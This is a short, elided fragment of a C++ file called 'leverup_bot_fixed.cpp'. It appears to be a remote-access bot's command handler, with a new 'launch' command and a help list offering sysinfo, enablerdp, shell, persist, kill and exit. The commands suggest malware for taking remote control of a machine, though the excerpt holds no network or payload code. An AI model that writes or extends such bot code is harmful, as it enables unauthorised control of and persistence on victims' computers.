// leverup_bot_fixed.cpp - COMPILABLE VERSION
...
void handleCommand(const std::string& command) {
    ...
    else if (command.find("launch ") == 0) {  // NEW: Handle launch command
        std::string appName = command.substr(7); // Extract everything after "launch "
        response = handleLaunch(appName);
    }
    else if (command == "help") {
        response = "[HELP] Available commands: sysinfo, enablerdp, dir, kill <pid>, launch <app/file>, shell, persist, help, exit\n";
    }
